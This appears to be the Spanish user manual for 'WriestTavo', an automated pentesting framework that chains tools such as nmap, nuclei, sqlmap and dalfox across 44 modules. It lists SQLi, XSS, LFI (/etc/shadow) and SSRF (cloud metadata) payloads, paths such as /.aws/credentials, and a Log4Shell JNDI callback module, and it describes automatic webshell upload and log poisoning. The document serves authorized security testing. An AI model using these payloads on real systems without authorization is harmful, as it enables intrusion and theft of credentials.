# ⚡ WriestTavo v4.0 — Manual Completo
### Bug Bounty · Pentesting · Vuln Analysis · CTF
**By WRIΞSTTAV0**

---

> ⚠️ **AVISO LEGAL**: Este script debe usarse ÚNICAMENTE en sistemas con autorización explícita del propietario. El uso no autorizado es ilegal. Solo para entornos propios, Bug Bounty con scope definido, o auditorías con contrato firmado.

---

## 📋 Tabla de Contenidos

1. [¿Qué es WriestTavo?](#qué-es-wriestTavo)
2. [Instalación y Requisitos](#instalación-y-requisitos)
3. [Primeros Pasos](#primeros-pasos)
4. [Modos de Escaneo](#modos-de-escaneo)
5. [Menú de Presets](#menú-de-presets)
6. [Los 44 Módulos — Referencia Completa](#los-44-módulos)
7. [Sistema INTEL — Inteligencia Compartida](#sistema-intel)
8. [Sistema de Actualización](#sistema-de-actualización)
9. [Agregar Payloads Propios](#agregar-payloads-propios)
10. [Agregar Módulos Propios](#agregar-módulos-propios)
11. [Exploit Intelligence — EDB + NVD + GHSA](#exploit-intelligence)
12. [El Reporte HTML](#el-reporte-html)
13. [Flujo Completo de Trabajo](#flujo-completo-de-trabajo)
14. [Comandos de Referencia Rápida](#comandos-de-referencia-rápida)
15. [Estructura de Archivos](#estructura-de-archivos)
16. [Preguntas Frecuentes](#preguntas-frecuentes)

---

## ¿Qué es WriestTavo?

WriestTavo es un **framework de pentesting automatizado** con 44 módulos que cubren el stack tecnológico moderno completo. No es solo un escáner — es un sistema de **inteligencia compartida**: cada módulo aprende del anterior y adapta sus técnicas automáticamente.

### Lo que lo hace diferente

```
Scanner normal:       WriestTavo:
  Escanea → reporta    Escanea → aprende → adapta → escala → reporta

  Sin contexto         whatweb detecta Laravel
                            ↓
                       gobuster usa wordlist Laravel
                            ↓
                       LFI busca /.env, /storage/logs/
                            ↓
                       SSTI prueba payloads Blade/Twig
                            ↓
                       EDB busca "laravel" en exploits
```

### Cobertura del Stack Moderno

| Categoría | Tecnologías Cubiertas |
|-----------|----------------------|
| **Frontend** | React, Next.js, Vue, Nuxt, Angular, Svelte/Kit, Astro, Remix |
| **Backend** | PHP/Laravel/Symfony, Node.js/Express/NestJS, Python/Django/Flask/FastAPI, .NET/ASP.NET Core, Ruby on Rails, Java/Spring/Tomcat |
| **CMS** | WordPress, Joomla, Drupal, Magento |
| **Bases de datos** | MySQL, PostgreSQL, MongoDB, Redis, Elasticsearch |
| **Servidores** | Apache, Nginx, IIS (Windows), Caddy |
| **Cloud/Infra** | Docker, Kubernetes, AWS/GCP/Azure metadata, Prometheus, Grafana |
| **APIs** | REST, GraphQL, Swagger/OpenAPI, FastAPI /docs, gRPC básico |

---

## Instalación y Requisitos

### Requisito Base
- **Kali Linux** (recomendado) o cualquier distro con las herramientas
- `sudo` / root
- Python 3.x (ya incluido en Kali)
- Conexión a internet (para módulos online, EDB, NVD)

### Instalación Automática (recomendado)

```bash
# 1. Dar permisos al script
chmod +x wriestTavo.sh

# 2. Instalador automático — instala TODAS las dependencias
sudo ./wriestTavo.sh --install
```

El instalador cubre:

**Via apt:**
```
nmap  curl  python3  python3-pip  git  wget  whatweb  nikto
gobuster  wafw00f  sslscan  dnsrecon  smtp-user-enum  snmp
sqlmap  wpscan  crackmapexec  commix  enum4linux-ng
seclists  wordlists  exploitdb
```

**Via Go (si está instalado):**
```
nuclei    subfinder    dalfox
```

**Via pip3:**
```
arjun    dnsrecon    theHarvester
```

### Instalación Manual (herramientas clave)

```bash
# Core
sudo apt update && sudo apt install -y nmap curl python3 python3-pip git

# Web scanning
sudo apt install -y whatweb nikto gobuster wafw00f sslscan nuclei

# Recon OSINT
sudo apt install -y dnsrecon subfinder
pip3 install theHarvester --break-system-packages

# Fuzzing y análisis
sudo apt install -y ffuf sqlmap wpscan commix
pip3 install arjun --break-system-packages

# Infra / Red Team
sudo apt install -y crackmapexec enum4linux-ng snmp smtp-user-enum

# Exploit DB local
sudo apt install -y exploitdb   # incluye searchsploit

# Payloads
sudo apt install -y seclists wordlists

# XSS avanzado
go install github.com/hahwul/dalfox/v2@latest
```

---

## Primeros Pasos

### Ejecución Básica

```bash
# Forma 1: por IP
sudo ./wriestTavo.sh 192.168.1.100

# Forma 2: por dominio
sudo ./wriestTavo.sh ejemplo.com

# Forma 3: URL completa (recomendado — preserva protocolo y path)
sudo ./wriestTavo.sh https://app.ejemplo.com

# Forma 4: con modo específico
sudo ./wriestTavo.sh --mode stealth 10.10.10.5
sudo ./wriestTavo.sh --mode aggressive https://target.com

# Forma 5: output personalizado
sudo ./wriestTavo.sh -o /tmp/mi_scan https://target.com
```

### Primera Ejecución Recomendada

```bash
# Paso 1: Instalar herramientas
sudo ./wriestTavo.sh --install

# Paso 2: Actualizar bases de datos (CVEs, nuclei, SecLists, EDB)
sudo ./wriestTavo.sh --update

# Paso 3: Configurar actualización automática diaria
sudo ./wriestTavo.sh --cron

# Paso 4: Primer scan
sudo ./wriestTavo.sh https://mi-target.com
```

Al ejecutar el scan, el script te pregunta:
```
⚠  AVISO LEGAL: Solo usar en sistemas con autorización explícita.
  Confirmo que tengo autorización [s/N]: s

[Menú de módulos aparece aquí]
```

---

## Modos de Escaneo

| Modo | Flag | Descripción | Uso recomendado |
|------|------|-------------|-----------------|
| `normal` | (default) | Balance entre velocidad y detección | Auditorías generales |
| `stealth` | `--mode stealth` | Más lento, menos ruido, delay entre peticiones | Bug Bounty con WAF, pentest silencioso |
| `aggressive` | `--mode aggressive` | Sin límites, máximo ruido, más payloads | CTF, laboratorios, HackTheBox |

### Diferencias técnicas por modo

```
normal:    nmap top-1000 puertos, delay normal, gobuster threads estándar
stealth:   nmap top-500 puertos, +delay WAF, gobuster threads reducidos
aggressive: nmap full scan (-p-), sin delay, nuclei full templates, dalfox maximal
```

---

## Menú de Presets

Al ejecutar el script, aparece este menú con 11 opciones:

```
[1]  Full Scan v4.0         → 44 módulos en orden óptimo (7 fases)
[2]  Recon OSINT            → crt.sh + theHarvester + dnsrecon + subdominios
[3]  Web + SSL              → WAF + nikto + nuclei + gobuster + sslscan + arjun
[4]  Bug Bounty Pro         → recon + framework + injection + CORS + JWT + SSRF + EDB
[5]  Injection Suite        → SQLi + NoSQLi + XSS + LFI + SSTI + SSRF + CORS + CMDi
[6]  API Modern             → endpoints + GraphQL + Swagger + arjun + JWT + CORS
[7]  Windows/Infra          → IIS + NTLM + RDP + SMB + Docker + K8s + SNMP
[8]  Framework Deep         → whatweb + framework_scan + SSTI + SSRF + rutas críticas
[9]  WordPress              → wpscan + nuclei + gobuster + SQLi + XSS
[10] CTF/HTB Mode           → todos los módulos en modo agresivo
[11] Custom                 → elegir módulos individuales (1-44)
```

### ¿Cuándo usar cada uno?

| Preset | Situación ideal |
|--------|----------------|
| `[1] Full Scan` | Primera vez en un target, audit completo |
| `[2] OSINT` | Fase de reconocimiento pasivo, no tocar el target |
| `[3] Web + SSL` | Target web con certificado, verificar configuración |
| `[4] Bug Bounty Pro` | Programa de bug bounty, máxima cobertura con reportes |
| `[5] Injection Suite` | Cuando ya tienes URLs con parámetros para probar |
| `[6] API Modern` | APIs REST/GraphQL, apps SPA modernas |
| `[7] Windows/Infra` | Entornos Windows, Active Directory, infraestructura |
| `[8] Framework Deep` | Cuando sabes el framework y quieres rutas específicas |
| `[9] WordPress` | Sitios WordPress con plugins/themes |
| `[10] CTF/HTB` | Laboratorios y CTFs, sin restricciones |
| `[11] Custom` | Cuando sabes exactamente qué módulos necesitas |

---

## Los 44 Módulos

### FASE 1: Reconocimiento Pasivo (sin tocar el target)

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 26 | `crtsh` | Consulta Certificate Transparency logs para descubrir subdominios. 100% pasivo. | `INTEL_SUBDOMAINS[]` |
| 17 | `theharvester` | Recolecta emails, IPs y subdominios desde Google, Bing, crtsh, urlscan. Sin tocar el target. | `INTEL_SUBDOMAINS[]`, emails |
| 18 | `dnsrecon` | DNS completo: zone transfer (CRÍTICO si lo permite), SPF, DMARC, MX, fuerza bruta. | `INTEL_SERVICES[]` |

### FASE 2: Infraestructura

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 1 | `ttl_os` | Detecta OS por TTL (64=Linux, 128=Windows). Sin hacer ruido. | `INTEL_OS` |
| 2 | `port_scan` | Escaneo de puertos TCP con nmap. Detecta puertos web, SMB, SNMP, etc. | `WEB_PORTS[]`, activa módulos condicionalmente |
| 3 | `version_scan` | Detecta versiones exactas de servicios. Identifica tech stack. | `INTEL_TECHNOLOGIES[]`, `INTEL_OS` confirmado |
| 38 | `infra_exposure` | Busca Docker API (2375/2376), Kubernetes (8001/6443/10250), Prometheus, Grafana, Kibana sin auth. | `INTEL_DOCKER_EXPOSED`, `INTEL_K8S_EXPOSED` |

### FASE 3: Servicios de Red

| # | Módulo | Qué hace | Se activa cuando |
|---|--------|----------|-----------------|
| 10 | `smb` | SMB null sessions, shares, enum4linux-ng. | Puerto 445/139 abierto |
| 29 | `cme` | CrackMapExec: SMB signing, LDAP usuarios/grupos, WinRM. | Puerto 445/389/5985 |
| 28 | `snmp` | Prueba community strings por defecto (public/private/cisco). Expone config de red. | Puerto 161 abierto |
| 27 | `smtp_enum` | Enumera usuarios válidos con VRFY sin autenticación. | Puerto 25/465/587 |
| 9 | `subdominios` | Fuerza bruta de subdominios con subfinder/amass. | Siempre (si es dominio) |

### FASE 4: Fingerprinting Web

| # | Módulo | Qué hace | Retroalimenta |
|---|--------|----------|---------------|
| 4 | `waf` | Detecta WAF (Cloudflare, Akamai, AWS, F5, etc.) con wafw00f. | `INTEL_WAF_DETECTED`, `INTEL_WAF_NAME`, ajusta delay automático |
| 5 | `http_headers` | Analiza headers de seguridad: CSP, HSTS, X-Frame-Options, cookies sin Secure/HttpOnly, server version. | `INTEL_TECHNOLOGIES[]` |
| 19 | `sslscan` | TLS/SSL: versiones obsoletas (1.0/1.1/SSLv3), ciphers débiles (RC4/3DES), Heartbleed, certificado expirado. | Solo si puerto 443/8443 |
| 6 | `whatweb` | Identifica CMS, framework, librerías, versiones. Detección de 50+ tecnologías. | `INTEL_CMS`, `INTEL_FRAMEWORK_JS`, `INTEL_FRAMEWORK_BACKEND` |
| 25 | `wpscan` | Enumera usuarios, plugins y themes de WordPress con CVEs. | Solo si `INTEL_CMS=wordpress` |
| 7 | `nikto` | Escaneo genérico de vulnerabilidades web conocidas. | `INTEL_NIKTO_FINDINGS` |

### FASE 5: Escaneo Profundo

| # | Módulo | Qué hace | Se adapta según |
|---|--------|----------|----------------|
| 20 | `nuclei` | 9000+ templates: CVEs, misconfigs, exposures, tecnologías. El estándar de bug bounty. | `INTEL_CMS` → templates WP; `INTEL_WAF_DETECTED` → headers evasión |
| 30 | `framework_scan` | Busca rutas críticas específicas del framework: `.env`, `/telescope`, `/_next/`, `/docs`, `trace.axd`, etc. | Requiere `INTEL_FRAMEWORK_*` detectado |
| 8 | `gobuster` | Fuerza bruta de directorios y archivos. | `INTEL_WORDLIST_EXTRA` según CMS; `INTEL_WAF_DETECTED` → delay |
| 24 | `arjun` | Descubre parámetros GET/POST ocultos. Detecta: debug, admin, cmd, file, redirect. | Resultado va a `INTEL_INJECTABLE_URLS[]` |
| 15 | `endpoints` | Descubre endpoints API: `/api/v1/`, `/graphql`, `/swagger`, `/actuator`, `/metrics`. | `INTEL_API_ENDPOINTS[]`, `INTEL_GRAPHQL_URL`, `INTEL_SWAGGER_URL` |
| 16 | `js_analysis` | Extrae secrets, JWTs, API keys, endpoints y frameworks de bundles JavaScript. | `INTEL_JWT_TOKENS[]`, `INTEL_JS_SECRETS[]`, `INTEL_FRAMEWORK_JS` |

### FASE 6: Vulnerabilidades Web

| # | Módulo | Qué hace | Se activa/adapta cuando |
|---|--------|----------|------------------------|
| 13 | `sqli` | Prueba SQLi básico con payloads en URLs de gobuster/arjun. Detecta errores y time-based. | `INTEL_INJECTABLE_URLS[]`; payloads según DB detectada (MySQL/PG/MSSQL) |
| 21 | `sqlmap` | Confirma y explota SQLi encontrado por módulo 13. Usa `--tamper` si hay WAF. | **Solo si** `INTEL_SQLI_FOUND=true` |
| 36 | `nosqli` | Inyección NoSQL: `{$gt:""}`, `{$where:"sleep(2000)"}`, bypass de login MongoDB. | **Solo si** mongodb en `INTEL_TECHNOLOGIES` o hay API endpoints |
| 14 | `xss` | Prueba XSS reflejado con payloads en parámetros de URLs. | `INTEL_INJECTABLE_URLS[]` |
| 22 | `dalfox` | XSS avanzado: DOM-based, Header-based, contexto JS, codificaciones complejas. | Profundiza lo encontrado por módulo 14 |
| 23 | `commix` | Command injection / OS command execution. RCE completo. | `INTEL_INJECTABLE_URLS[]` |
| 31 | `lfi` | Path Traversal y LFI. **Escala automáticamente**: si confirma LFI → intenta RFI + PHP wrappers + log poisoning. | Payloads extra desde `INTEL_EXTRA_PAYLOADS_LFI[]` |
| 32 | `ssrf` | Server-Side Request Forgery. **Si confirma**: prueba AWS metadata `169.254.169.254`, GCP `metadata.google.internal`, Azure automáticamente. | `INTEL_INJECTABLE_URLS[]`; si encuentra → `INTEL_SSRF_FOUND=true` |
| 33 | `ssti` | Template injection: Jinja2, Twig, Blade, Smarty, ERB, Freemarker. RCE si se confirma. | Requiere framework con template engine en `INTEL_FRAMEWORK_BACKEND` |
| 34 | `cors` | Prueba CORS misconfig: origin reflection, null origin, wildcard + credentials. **Genera cors_poc.html automáticamente.** | Si encuentra → `INTEL_CORS_VULN=true`, `INTEL_CORS_ORIGIN` |
| 35 | `jwt` | Analiza JWTs encontrados en headers/JS. Prueba: `alg:none`, RS256→HS256 confusion, crack con hashcat+rockyou. | `INTEL_JWT_TOKENS[]` de módulo 16 |
| 39 | `xxe` | XML External Entity en APIs XML, SOAP, SVG upload. Lee `/etc/passwd` si vulnerable. | `INTEL_TECHNOLOGIES` con java/aspnet/php o `INTEL_API_ENDPOINTS[]` |
| 40 | `idor_redirect` | IDOR: detecta IDs incrementales y respuestas diferentes. Open Redirect: prueba 10 payloads en 30 parámetros. | `INTEL_API_ENDPOINTS[]`, `INTEL_INJECTABLE_URLS[]` |
| 41 | `iis_windows` | IIS específico: ShortName 8.3, trace.axd, WebDAV, NTLM exposure, ViewState sin MAC. | **Solo si** `INTEL_OS=windows` o iis/aspnet en `INTEL_TECHNOLOGIES` |
| 37 | `http_methods` | Prueba PUT, DELETE, TRACE, CONNECT, PATCH, DEBUG. PUT → intenta subir webshell de prueba. | Todos los targets web |

### FASE 7: Post-Scan

| # | Módulo | Qué hace |
|---|--------|----------|
| 43 | `edb_intel` | **Exploit Intelligence**: cruza stack vs EDB local + EDB online + NVD CVEs CVSS≥9 + GitHub Advisories. |
| 11 | `vuln_scan` | nmap NSE scripts de vulnerabilidades sobre puertos detectados. |
| 12 | `searchsploit` | Busca exploits para todas las versiones detectadas en el scan de versiones. |
| 44 | `edb_search` | Búsqueda manual interactiva en EDB + NVD + GHSA desde el script. |

---

## Sistema INTEL

El cerebro de WriestTavo. Son 52 variables compartidas entre módulos que hacen que el scan sea progresivo e inteligente.

### Variables Principales

```bash
# Sistema operativo
INTEL_OS=""                    # linux | windows | other

# WAF
INTEL_WAF_DETECTED=false
INTEL_WAF_NAME=""
INTEL_SCAN_DELAY=0             # Se aumenta automáticamente si hay WAF

# Frameworks detectados
INTEL_CMS=""                   # wordpress | joomla | drupal | magento
INTEL_FRAMEWORK_JS=""          # react | nextjs | vue | nuxt | angular | svelte | astro | remix
INTEL_FRAMEWORK_BACKEND=""     # laravel | symfony | django | flask | fastapi | nestjs | express | aspnet | dotnetcore | rails

# Stack tecnológico
INTEL_TECHNOLOGIES=()          # php, nodejs, python, java, mysql, redis, docker, etc.

# URLs y endpoints descubiertos
INTEL_INJECTABLE_URLS=()       # URLs con parámetros → van a SQLi, XSS, LFI, SSRF
INTEL_API_ENDPOINTS=()         # Endpoints API → van a arjun, NoSQLi, XXE
INTEL_SENSITIVE_PATHS=()       # Rutas sensibles encontradas
INTEL_FRAMEWORK_ROUTES=()      # Rutas del framework probadas en módulo 30

# Tokens y secretos
INTEL_JWT_TOKENS=()            # JWTs encontrados → van al módulo 35
INTEL_JS_SECRETS=()            # Secrets en archivos JS
INTEL_API_KEYS=()              # API keys encontradas

# APIs especiales
INTEL_GRAPHQL_URL=""           # URL de GraphQL si se descubrió
INTEL_SWAGGER_URL=""           # URL de Swagger/OpenAPI

# Vulnerabilidades confirmadas
INTEL_SQLI_FOUND=false         # → activa sqlmap automáticamente
INTEL_XSS_FOUND=false
INTEL_LFI_FOUND=false
INTEL_LFI_PARAM=""             # Parámetro vulnerable
INTEL_LFI_URL=""               # URL vulnerable
INTEL_SSRF_FOUND=false
INTEL_SSRF_URL=""              # → prueba cloud metadata automáticamente
INTEL_SSTI_FOUND=false
INTEL_CORS_VULN=false
INTEL_CORS_ORIGIN=""           # → usado para generar PoC CSRF

# Infraestructura
INTEL_DOCKER_EXPOSED=false
INTEL_K8S_EXPOSED=false
INTEL_CLOUD_PROVIDER=""        # aws | gcp | azure | cloudflare

# Payloads custom (cargados por el usuario)
INTEL_EXTRA_PAYLOADS_SQLI=()   # Payloads extra para módulo 13
INTEL_EXTRA_PAYLOADS_XSS=()    # Payloads extra para módulo 14
INTEL_EXTRA_PAYLOADS_LFI=()    # Payloads extra para módulo 31

# Exploit intelligence
INTEL_NVD_CVES=()              # CVEs de NVD del stack
INTEL_GHSA_VULNS=()            # GitHub Security Advisories
INTEL_EDB_RESULTS=()           # Exploits encontrados en EDB
```

### Cómo Fluye la Inteligencia

```
Ejemplo real con WordPress + PHP + MySQL:

whatweb detecta:
  INTEL_CMS = "wordpress"
  INTEL_TECHNOLOGIES = ["php", "mysql"]
  INTEL_FRAMEWORK_BACKEND = "laravel"  ← si es Laravel
        ↓
gobuster usa:
  wordlist = /usr/share/seclists/.../wordpress.fuzz.txt
        ↓
nuclei agrega:
  templates = -t wordpress/ (además de los defaults)
        ↓
sqli usa:
  payloads MySQL (no genéricos)
  URLs de gobuster que terminaron en .php?id=
        ↓
sqlmap activa:
  --dbms=mysql --tamper=space2comment (si hay WAF)
        ↓
edb_intel busca:
  "wordpress", "wordpress plugin rce", "wordpress plugin sqli"
  en searchsploit + EDB online + NVD CVEs de "wordpress"
```

---

## Sistema de Actualización

WriestTavo tiene un sistema para mantenerse al día con vulnerabilidades nuevas que salen cada día.

### Comandos de Actualización

```bash
# Actualizar TODO (recomendado semanalmente)
sudo ./wriestTavo.sh --update

# Configurar actualización automática diaria a las 6am
sudo ./wriestTavo.sh --cron

# Ver qué hay en caché (CVEs, payloads, módulos custom)
sudo ./wriestTavo.sh --show-cves
```

### ¿Qué actualiza `--update`?

```
[1/5] nuclei templates
      → nuclei -update-templates
      → descarga los últimos templates (CVEs, misconfigs, exposures)
      → normalmente 50-200 templates nuevos por semana

[2/5] NVD CVE Feed (últimas 48h)
      → https://services.nvd.nist.gov/rest/json/cves/2.0
      → filtra CVEs con CVSS ≥ 9.0
      → guarda en ~/.wriestTavo/cve_cache/nvd_recent.json

[3/5] Exploit-DB RSS feed
      → https://www.exploit-db.com/rss.xml
      → los últimos exploits publicados
      → guarda en ~/.wriestTavo/edb_cache/exploitdb_recent.txt

[4/5] SecLists (si es repo git)
      → git -C /usr/share/seclists pull
      → wordlists nuevas, payloads actualizados

[5/5] Carga payloads custom del usuario
      → lee ~/.wriestTavo/custom_payloads/*.txt
      → los inyecta en los módulos en memoria
```

### Alerta de Desactualización

Si han pasado más de 7 días sin actualizar, el script te avisa:
```
⚠  7 días sin actualizar. Ejecuta: sudo ./wriestTavo.sh --update
```

---

## Agregar Payloads Propios

Esta es una de las funciones más poderosas. Cuando lees un writeup nuevo, encuentras un bypass, o ves un exploit en Exploit-DB, puedes agregarlo al script en **una sola línea**.

### Agregar desde la Línea de Comandos

```bash
# SQLi — agregar bypass nuevo
sudo ./wriestTavo.sh --add-payload "' OR SLEEP(2)--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "';WAITFOR DELAY '0:0:2'--" --payload-type sqli
sudo ./wriestTavo.sh --add-payload "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--" --payload-type sqli

# XSS — evasión de WAF/filtros
sudo ./wriestTavo.sh --add-payload "<svg/onload=alert(1)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<img src=x onerror=alert(document.cookie)>" --payload-type xss
sudo ./wriestTavo.sh --add-payload "jaVaScRiPt:alert(1)" --payload-type xss
sudo ./wriestTavo.sh --add-payload "<!--<img src=--><img src=x onerror=alert(1)//>" --payload-type xss

# LFI — rutas nuevas o específicas de frameworks
sudo ./wriestTavo.sh --add-payload "../../../../etc/shadow" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/proc/1/root/etc/passwd" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "....//....//....//etc/passwd" --payload-type lfi
sudo ./wriestTavo.sh --add-payload "/app/config/database.yml" --payload-type lfi

# SSRF — endpoints internos nuevos
sudo ./wriestTavo.sh --add-payload "http://127.0.0.1:8080/admin" --payload-type ssrf
sudo ./wriestTavo.sh --add-payload "http://kubernetes.default.svc/api/v1/" --payload-type ssrf

# Paths/rutas — directorios sensibles nuevos
sudo ./wriestTavo.sh --add-payload "/.git/FETCH_HEAD" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/actuator/heapdump" --payload-type paths
sudo ./wriestTavo.sh --add-payload "/.aws/credentials" --payload-type paths
```

### Tipos de Payload Disponibles

| Tipo | Archivo | Usado por módulo |
|------|---------|-----------------|
| `sqli` | `~/.wriestTavo/custom_payloads/sqli_extra.txt` | Módulo 13 (SQLi básico) |
| `xss` | `~/.wriestTavo/custom_payloads/xss_extra.txt` | Módulo 14 (XSS) |
| `lfi` | `~/.wriestTavo/custom_payloads/lfi_extra.txt` | Módulo 31 (LFI) |
| `ssrf` | `~/.wriestTavo/custom_payloads/ssrf_extra.txt` | Módulo 32 (SSRF) |
| `paths` | `~/.wriestTavo/custom_payloads/paths_extra.txt` | Módulo 8 (gobuster extra) |

### Editar los Archivos Directamente

```bash
# Ver qué payloads tienes actualmente
sudo ./wriestTavo.sh --show-cves

# Editar directamente (formato: un payload por línea, # para comentarios)
nano ~/.wriestTavo/custom_payloads/sqli_extra.txt
nano ~/.wriestTavo/custom_payloads/xss_extra.txt
nano ~/.wriestTavo/custom_payloads/lfi_extra.txt

# Ejemplo de archivo sqli_extra.txt:
# ── Bypass MySQL 8.x WAF (writeup 2024-03) ──
' /*!50000OR*/ '1'='1
' OR SLEEP(2) AND '1'='1
# ── MSSQL time-based ──
'; WAITFOR DELAY '0:0:3'--
```

### Cómo se Cargan los Payloads

```
Al ejecutar ./wriestTavo.sh:
  init_update_system() crea los directorios si no existen
  _load_custom_payloads() lee los .txt y los carga en:
    INTEL_EXTRA_PAYLOADS_SQLI[]
    INTEL_EXTRA_PAYLOADS_XSS[]
    INTEL_EXTRA_PAYLOADS_LFI[]

Al ejecutar módulo 13 (SQLi):
  ALL_PAYLOADS = PAYLOADS_BASE[] + INTEL_EXTRA_PAYLOADS_SQLI[]
  → todos los payloads (internos + tuyos) se prueban juntos
```

---

## Agregar Módulos Propios

WriestTavo tiene un sistema de plugins. Puedes agregar módulos completamente nuevos sin tocar el script original.

### Estructura de Directorios

```
~/.wriestTavo/
├── custom_payloads/
│   ├── sqli_extra.txt
│   ├── xss_extra.txt
│   ├── lfi_extra.txt
│   ├── ssrf_extra.txt
│   └── paths_extra.txt
├── modules/                    ← TUS MÓDULOS AQUÍ
│   ├── modulo_log4shell.sh
│   ├── modulo_polyfill.sh
│   └── modulo_mi_vuln_nueva.sh
├── edb_cache/
└── cve_cache/
```

### Plantilla de Módulo Custom

```bash
# Archivo: ~/.wriestTavo/modules/modulo_mi_vuln.sh

modulo_mi_vuln() {
    # ── Condición de activación (opcional) ──
    # Solo ejecutar si detectamos algo relevante
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " php " ]] && {
        warn "Mi vuln: PHP no detectado. Saltar."
        return
    }

    log "MÓDULO CUSTOM: Mi Vulnerabilidad Nueva"
    tip "Descripción de qué hace y por qué importa."

    # ── Variables locales ──
    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/mi_vuln_results.txt"

    echo "Mi Vuln — $(date)" > "$out_file"

    # ── Respetar delay de WAF ──
    local delay=0
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && delay="${INTEL_SCAN_DELAY}"

    # ── Tu lógica de prueba aquí ──
    local resp
    resp=$(curl -skL --max-time 10 "${base_url}/ruta-especifica" 2>/dev/null)

    if echo "$resp" | grep -qiE "patron_de_vulnerabilidad|error_especifico"; then
        # ── Guardar en INTEL para que otros módulos lo usen ──
        INTEL_SENSITIVE_PATHS+=("${base_url}/ruta-especifica")

        # ── Reportar hallazgo ──
        # add_finding SEVERIDAD TÍTULO DETALLE CVSS REMEDIACIÓN SIGUIENTE_PASO
        add_finding "CRÍTICO" \
            "Mi Vulnerabilidad Nueva Confirmada" \
            "<b>URL:</b> ${base_url}/ruta-especifica<br><b>Evidencia:</b><pre>${resp:0:300}</pre>" \
            "9.8" \
            "Actualizar a la versión parcheada. Aplicar workaround X." \
            "Explotar con: curl -X POST '${base_url}/ruta' -d 'payload=PAYLOAD'"

        intel_log "MI_VULN confirmada en ${base_url}"
        echo "VULN: ${base_url}/ruta-especifica" >> "$out_file"
    else
        ok "Mi vuln: no detectada en este target."
    fi

    [[ "$delay" -gt 0 ]] && sleep "0.${delay}"
    echo
}
```

### Cargar el Módulo

Los módulos custom se cargan **automáticamente** cada vez que ejecutas el script:
```bash
# Al ejecutar el scan, verás:
# [INFO] Módulo custom cargado: modulo_mi_vuln.sh

# Para ejecutarlo manualmente (opción 11 → Custom):
sudo ./wriestTavo.sh target.com
# → [11] Custom
# → escribir el nombre (si lo agregaste al case) o ejecutarlo con:
source ~/.wriestTavo/modules/modulo_mi_vuln.sh && modulo_mi_vuln
```

### Agregar al Menú Custom (opcional)

Para que aparezca en el menú [11] Custom, agrega al script principal:

```bash
# En el bloque case dentro de menu_custom():
# Busca la línea: 43) modulo_edb_intel ;; ...
# Y agrega:
45) modulo_mi_vuln ;;
```

### Ejemplos de Módulos Custom Útiles

#### Log4Shell (CVE-2021-44228)
```bash
# ~/.wriestTavo/modules/modulo_log4shell.sh
modulo_log4shell() {
    [[ ! " ${INTEL_TECHNOLOGIES[*]} " =~ " java " ]] && return
    log "CUSTOM: Log4Shell (CVE-2021-44228)"

    local callback_url="http://TU-BURP-COLLABORATOR"
    local payload="\${jndi:ldap://${callback_url}/log4shell}"

    curl -skL --max-time 10 \
        -H "X-Api-Version: ${payload}" \
        -H "User-Agent: ${payload}" \
        "${ORIGINAL_URL:-http://${TARGET}}/" >/dev/null 2>&1

    add_finding "INFO" "Log4Shell Test Enviado" \
        "Payload JNDI enviado. Verificar en Burp Collaborator si hubo callback." \
        "10.0" \
        "Actualizar log4j a 2.17.1+. Deshabilitar JNDI lookup." \
        "Ver callback en: ${callback_url}"
    echo
}
```

#### Polyfill.io Supply Chain
```bash
# ~/.wriestTavo/modules/modulo_polyfill.sh
modulo_polyfill() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    log "CUSTOM: Polyfill.io Supply Chain Check"

    local resp
    resp=$(curl -skL --max-time 10 "${ORIGINAL_URL:-http://${TARGET}}/" 2>/dev/null)

    if echo "$resp" | grep -q "polyfill.io"; then
        add_finding "ALTO" "Polyfill.io Detectado" \
            "El sitio carga scripts de polyfill.io (dominio comprometido en 2024)." \
            "8.0" \
            "Reemplazar polyfill.io con cdn.jsdelivr.net/npm/core-js o auto-hospedar." \
            "Ver: https://sansec.io/research/polyfill-supply-chain-attack"
    fi
    echo
}
```

---

## Exploit Intelligence

El módulo 43 y 44 conectan WriestTavo con bases de datos de exploits en tiempo real.

### Módulo 43 — EDB Intel (automático)

Se ejecuta automáticamente al final de cada Full Scan. Hace 4 búsquedas en paralelo:

**[1] searchsploit local (offline)**
```bash
# Lo que hace internamente, según el stack detectado:
searchsploit "php rce" --json          # si PHP detectado
searchsploit "laravel" --json          # si Laravel detectado
searchsploit "wordpress plugin rce" --json  # si WordPress
searchsploit "redis unauthenticated" --json # si Redis
# Filtra por impacto: RCE > SQLi > Auth Bypass > LFI
# Muestra badge MSF si tiene módulo Metasploit
```

**[2] Exploit-DB Online (últimos 30 días)**
```bash
# Primero intenta la API de EDB
POST https://www.exploit-db.com/search

# Si falla, usa el CSV de GitLab (actualizado en tiempo real):
https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv
# Filtra por keyword del stack + fecha >= 30 días atrás
# Caché de 24h para no saturar
```

**[3] NVD CVEs críticos**
```bash
# Por cada tecnología detectada, busca en NVD:
https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=TECH&cvssV3Severity=CRITICAL
# Muestra CVE-ID, CVSS score, descripción, fecha
# Si el CVE tiene referencia a EDB → badge "🎯 EDB" con link directo
```

**[4] GitHub Advisory Database (GHSA)**
```bash
# Según framework detectado:
# Laravel/Symfony → composer advisories
# Django/Flask/FastAPI → pip advisories
# Express/NestJS/Next.js → npm advisories
# Ruby on Rails → rubygems advisories
https://api.github.com/advisories?ecosystem=ECOSYSTEM
```

### Módulo 44 — Búsqueda Manual

```bash
# Desde el menú [11] Custom, seleccionar [44]
# El script te pregunta qué buscar:
🔍 Buscar en Exploit-DB + NVD: wordpress 5.8

# Muestra:
# - Resultados de searchsploit con colores
# - Link directo a EDB online
# - CVEs en NVD
# - Link a GHSA
# - Link a Metasploit DB (Rapid7)
```

